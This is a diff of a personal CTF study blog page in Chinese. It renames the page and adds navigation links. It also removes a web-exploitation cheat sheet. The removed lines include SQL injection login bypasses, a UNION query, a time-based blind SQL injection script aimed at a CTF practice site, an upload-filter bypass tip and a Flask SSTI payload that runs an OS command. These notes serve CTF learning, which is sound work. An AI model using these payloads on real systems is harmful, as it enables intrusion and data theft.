@@ -42,7 +42,7 @@
     
     
       
-        <title>学习基本思路 - windforce17's blog</title>
+        <title>CTFstudy - windforce17's blog</title>
       
     
     
@@ -133,7 +133,7 @@
                 windforce17's blog
               </span>
               <span class="md-header-nav__topic">
-                学习基本思路
+                CTFstudy
               </span>
             
           
@@ -1345,8 +1345,8 @@
       
     
     
-    <a href="./" title="学习基本思路" class="md-nav__link md-nav__link--active">
-      学习基本思路
+    <a href="./" title="CTFstudy" class="md-nav__link md-nav__link--active">
+      CTFstudy
     </a>
     
   </li>
@@ -1463,6 +1463,18 @@
   <li class="md-nav__item">
     <a href="../misc/misc/" title="Misc" class="md-nav__link">
       Misc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/webasm/" title="Webasm" class="md-nav__link">
+      Webasm
     </a>
   </li>
 
@@ -1631,6 +1643,18 @@
   <li class="md-nav__item">
     <a href="../web/php文件包含/" title="Php文件包含" class="md-nav__link">
       Php文件包含
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/ssti/" title="Ssti" class="md-nav__link">
+      Ssti
     </a>
   </li>
 
@@ -1819,7 +1843,7 @@
                   <a href="https://github.com/Windforce17/blog/blob/master/docs/ctf/CTFstudy.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="_1">学习基本思路<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+                <h2 id="_1">学习基本思路<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span>* 第一阶段，拿到题目要能看懂
 * 第二阶段，分析出题目逻辑
 
@@ -1832,65 +1856,15 @@
 </pre></div>
 
 
-<h1 id="web">WEB<a class="headerlink" href="#web" title="Permanent link">&para;</a></h1>
-<p>.index.php.swp 文件可能隐藏源代码
-16进制编码可以绕过注入</p>
-<h2 id="sql">sql绕过，万能密码<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
-<p>假设sql语句如下：
-select * from user where username='用户名' and password='密码'</p>
-<hr />
-<h3 id="_2">数据类型<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
-<p>sql里面弱类型的比较，以下情况都会为true：</p>
-<ul>
-<li>1='1'</li>
-<li>1='1.0'</li>
-<li>1='1后接字母(再后面有数字也可以)'</li>
-<li>0='除了非0数字开头的字符串'
-    uname=admin
-    &amp;passwd=admin'||'1'='1</li>
-</ul>
-<h3 id="_3">双等号<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<p>username=p'='&amp;password=p'='</p>
-<h3 id="00">特殊截断符号“%00<a class="headerlink" href="#00" title="Permanent link">&para;</a></h3>
-<p>username=a'+0;%00&amp;password=</p>
-<h2 id="_4">回显注入<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
-<p>?name=admin' and 1=2 union select 1,2,group_concat(flag) from flag--+</p>
-<h2 id="_5">延时注入<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
-<p>import requests</p>
-<p>import string</p>
-<p>s=requests.session()</p>
-<p>url="<a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a>"</p>
-<p>flag=''</p>
-<p>guess=string.lowercase+string.uppercase+string.digits</p>
-<p>for i in range(33):</p>
-<p>for st in guess:</p>
-<p>headers={"x-forwarded-for":"1'+"+"(select case when(substr((select flag from flag) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1" %(i,st)}</p>
-<p>try:</p>
-<p>res=s.get(url,headers=headers,timeout=4)</p>
-<p>except requests.exceptions.ReadTimeout:</p>
-<p>flag+=st</p>
-<p>print "flag:",flag</p>
-<p>break</p>
-<p>print "result:"+flag</p>
-<h2 id="_6">图片上传<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
-<p>upload success, but not php!
-multipart/form-data变换一下大小写，再把第二个Content-Type改成图片类</p>
 <h2 id="kindeditor417">kindeditor4.1.7<a class="headerlink" href="#kindeditor417" title="Permanent link">&para;</a></h2>
 <p>泄漏路径问题，漏洞根源位于/php/file_manager_json.php。</p>
-<h1 id="_7">杂碎<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h1>
+<h1 id="_2">杂碎<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
 <p>培根密码,当铺密码解密，JS/VBS/ASP加密解密<br />
-cap无线密码破解-aircrack-win<br />
-cap包无线解密，airdecap-ng -e SSID -p PASSWORD
-MP3Stego Decode.exe -X -P PASSWORD
-rz sz命令</p>
-<h2 id="string-tr">string 命令提取字符串，tr去除换行<a class="headerlink" href="#string-tr" title="Permanent link">&para;</a></h2>
-<p>strings qweqwe.pcapng | grep '^[a-z0-9]{14}$' | tr -d '\n' &gt; test.txt  </p>
-<h2 id="_8">工具<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+MP3Stego Decode.exe -X -P PASSWORD</p>
+<h2 id="_3">工具<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
 <p>cheat engine</p>
-<h2 id="_9">隐写<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<h2 id="_4">隐写<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
 <p>outguess -r 图片名 文件名</p>
-<h2 id="flask-ssti">flask ssti<a class="headerlink" href="#flask-ssti" title="Permanent link">&para;</a></h2>
-<p>{% for c in [].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() %} {% if c.<strong>name</strong> == 'catch_warnings' %} {% for b in c.<strong>init</strong>.func_globals.values() %} {% if b.<strong>class</strong> == {}.<strong>class</strong> %} {% if 'eval' in b.keys() %} {{ b<a href="'__import__(" title="os">'eval'</a>.popen("ls").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} </p>
                 
                   
                 
